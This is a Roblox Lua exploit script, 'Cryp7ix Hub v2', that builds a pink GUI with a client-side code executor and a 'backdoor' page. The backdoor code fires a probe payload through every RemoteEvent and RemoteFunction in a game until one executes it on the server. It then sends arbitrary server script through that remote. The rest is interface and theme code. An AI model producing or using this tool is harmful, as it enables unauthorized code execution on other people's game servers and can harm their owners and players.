-- Cryp7ix Hub v2
local UIS = game:GetService("UserInputService")
local CoreGui = game:GetService("CoreGui")
local RS = game:GetService("RunService")

-- GUI
local sg = Instance.new("ScreenGui", CoreGui)
sg.Name = "Cryp7ixHub"
sg.ResetOnSpawn = false

local main = Instance.new("Frame", sg)
main.Size = UDim2.new(0, 420, 0, 320)
main.Position = UDim2.new(0.5, -210, 0.5, -160)
main.BackgroundColor3 = Color3.fromRGB(255, 105, 180)
main.Active = true
main.Draggable = true

-- rounding
local round = Instance.new("UICorner")
round.CornerRadius = UDim.new(0, 8)
round.Parent = main

-- title bar
local bar = Instance.new("Frame", main)
bar.Size = UDim2.new(1, 0, 0, 28)
bar.BackgroundColor3 = Color3.fromRGB(200, 90, 160)
Instance.new("UICorner", bar).CornerRadius = UDim.new(0, 8)

local lbl = Instance.new("TextLabel", bar)
lbl.Size = UDim2.new(1, -60, 1, 0)
lbl.Position = UDim2.new(0, 5, 0, 0)
lbl.BackgroundTransparency = 1
lbl.Font = Enum.Font.Legacy
lbl.TextColor3 = Color3.new(1,1,1)
lbl.TextXAlignment = Enum.TextXAlignment.Left
lbl.Text = "🔨 Made By Cryp7ix_0"

local min = Instance.new("TextButton", bar)
min.Size = UDim2.new(0, 28, 1, 0)
min.Position = UDim2.new(1, -56, 0, 0)
min.Text = "-"
min.BackgroundColor3 = Color3.fromRGB(180,70,140)
min.TextColor3 = Color3.new(1,1,1)

local close = Instance.new("TextButton", bar)
close.Size = UDim2.new(0, 28, 1, 0)
close.Position = UDim2.new(1, -28, 0, 0)
close.Text = "X"
close.BackgroundColor3 = Color3.fromRGB(160,50,120)
close.TextColor3 = Color3.new(1,1,1)

-- buttons (left nav)
local nav = Instance.new("Frame", main)
nav.Size = UDim2.new(0, 40, 1, -28)
nav.Position = UDim2.new(0, 0, 0, 28)
nav.BackgroundColor3 = Color3.fromRGB(240,200,220)

local function mkBtn(txt, y)
    local b = Instance.new("TextButton", nav)
    b.Size = UDim2.new(1, 0, 0, 40)
    b.Position = UDim2.new(0, 0, 0, y)
    b.Text = txt
    b.Font = Enum.Font.Legacy
    b.TextColor3 = Color3.new(0,0,0)
    b.BackgroundColor3 = Color3.fromRGB(255, 182, 193)
    Instance.new("UICorner", b).CornerRadius = UDim.new(0, 6)
    return b
end

local bExec = mkBtn("🎛️", 0)
local bBD = mkBtn("👨‍💻", 45)
local bCloud = mkBtn("☁️", 90)
local bTheme = mkBtn("🖌️", 135)

-- container
local cont = Instance.new("Frame", main)
cont.Size = UDim2.new(1, -40, 1, -28)
cont.Position = UDim2.new(0, 40, 0, 28)
cont.BackgroundColor3 = Color3.fromRGB(255,240,245)
Instance.new("UICorner", cont).CornerRadius = UDim.new(0, 8)

-- pages
local pages = {}
local function mkPage()
    local f = Instance.new("Frame", cont)
    f.Size = UDim2.new(1,0,1,0)
    f.BackgroundTransparency = 1
    f.Visible = false
    table.insert(pages, f)
    return f
end

-- 🎛️ client executor
local pExec = mkPage()
local tb = Instance.new("TextBox", pExec)
tb.Size = UDim2.new(1,-20,1,-60)
tb.Position = UDim2.new(0,10,0,10)
tb.BackgroundColor3 = Color3.fromRGB(255,255,255)
tb.TextColor3 = Color3.new(0,0,0)
tb.MultiLine = true
tb.TextXAlignment = Enum.TextXAlignment.Left
tb.TextYAlignment = Enum.TextYAlignment.Top
tb.Text = "-- enter client script"

local runBtn = Instance.new("TextButton", pExec)
runBtn.Size = UDim2.new(0,100,0,30)
runBtn.Position = UDim2.new(0.5,-50,1,-40)
runBtn.Text = "▶️ Run"
runBtn.BackgroundColor3 = Color3.fromRGB(255,20,147)
runBtn.TextColor3 = Color3.new(1,1,1)

-- 👨‍💻 backdoor
local pBD = mkPage()
local bdTB = tb:Clone()
bdTB.Parent = pBD
bdTB.Text = "-- enter server script"
bdTB.TextColor3 = Color3.new(0,0,0)

local bdBtn = runBtn:Clone()
bdBtn.Parent = pBD
bdBtn.Text = "▶️ Run (BD)"

local injBtn = Instance.new("TextButton", pBD)
injBtn.Size = UDim2.new(0,100,0,30)
injBtn.Position = UDim2.new(0.5,-50,1,-80)
injBtn.Text = "👨‍💻 Inject"
injBtn.BackgroundColor3 = Color3.fromRGB(200,40,120)
injBtn.TextColor3 = Color3.new(1,1,1)

-- ☁️ cloud
local pCloud = mkPage()
local txt = Instance.new("TextLabel", pCloud)
txt.Size = UDim2.new(1,0,1,0)
txt.Text = "Not working for now.."
txt.TextColor3 = Color3.new(0,0,0)
txt.BackgroundTransparency = 1
txt.Font = Enum.Font.Legacy

-- 🖌️ theme
local pTheme = mkPage()
local function mkThemeBtn(name, clr, y)
    local b = Instance.new("TextButton", pTheme)
    b.Size = UDim2.new(0,120,0,30)
    b.Position = UDim2.new(0.5,-60,0,y)
    b.Text = name
    b.BackgroundColor3 = clr
    b.TextColor3 = Color3.new(0,0,0)
    return b
end

local tPink = mkThemeBtn("Pink", Color3.fromRGB(255,182,193), 0.1)
local tDark = mkThemeBtn("Dark", Color3.fromRGB(50,50,50), 0.25)
local tLight = mkThemeBtn("Light", Color3.fromRGB(240,240,240), 0.4)

-- page switching
local btns = {bExec,pExec,bBD,pBD,bCloud,pCloud,bTheme,pTheme}
local function showPage(pg)
    for _,f in ipairs(pages) do f.Visible=false end
    pg.Visible=true
end

bExec.MouseButton1Click:Connect(function() showPage(pExec) end)
bBD.MouseButton1Click:Connect(function() showPage(pBD) end)
bCloud.MouseButton1Click:Connect(function() showPage(pCloud) end)
bTheme.MouseButton1Click:Connect(function() showPage(pTheme) end)

showPage(pExec)

-- close/min
close.MouseButton1Click:Connect(function() sg:Destroy() end)
local minimized=false
min.MouseButton1Click:Connect(function()
    minimized=not minimized
    cont.Visible=not minimized
    nav.Visible=not minimized
    main.Size= minimized and UDim2.new(0,420,0,28) or UDim2.new(0,420,0,320)
end)

-- run client
runBtn.MouseButton1Click:Connect(function()
    local s=tb.Text
    local f=loadstring(s)
    if f then f() end
end)

-- backdoor stuff
local bdRemote=nil
injBtn.MouseButton1Click:Connect(function()
    bdRemote=nil
    for _,obj in pairs(game:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            local rName="BD"..math.random(1000,9999)
            local t='Instance.new("Model",workspace).Name="'..rName..'"'
            if obj:IsA("RemoteEvent") then obj:FireServer(t)
            else pcall(function() obj:InvokeServer(t) end) end
            task.wait(1)
            if workspace:FindFirstChild(rName) then
                bdRemote=obj
                break
            end
        end
    end
    if bdRemote then
        local hint=Instance.new("Hint",workspace)
        hint.Text="Backdoor Found"
        task.spawn(function()
            while bdRemote do
                task.wait(9)
                hint.Text="Backdoor Found"
            end
        end)
    else
        bdTB.Text="-- no backdoor"
    end
end)

bdBtn.MouseButton1Click:Connect(function()
    if not bdRemote then return end
    local s=bdTB.Text
    if bdRemote:IsA("RemoteEvent") then
        bdRemote:FireServer(s)
    else
        pcall(function() bdRemote:InvokeServer(s) end)
    end
end)

-- themes
local function applyTheme(bg, inner, text)
    main.BackgroundColor3=bg
    cont.BackgroundColor3=inner
    for _,v in pairs(cont:GetDescendants()) do
        if v:IsA("TextBox") or v:IsA("TextLabel") or v:IsA("TextButton") then
            v.TextColor3=text
        end
    end
end

tPink.MouseButton1Click:Connect(function()
    applyTheme(Color3.fromRGB(255,105,180),Color3.fromRGB(255,240,245),Color3.new(0,0,0))
end)
tDark.MouseButton1Click:Connect(function()
    applyTheme(Color3.fromRGB(40,40,40),Color3.fromRGB(70,70,70),Color3.new(1,1,1))
end)
tLight.MouseButton1Click:Connect(function()
    applyTheme(Color3.fromRGB(240,240,240),Color3.fromRGB(255,255,255),Color3.new(0,0,0))
end)
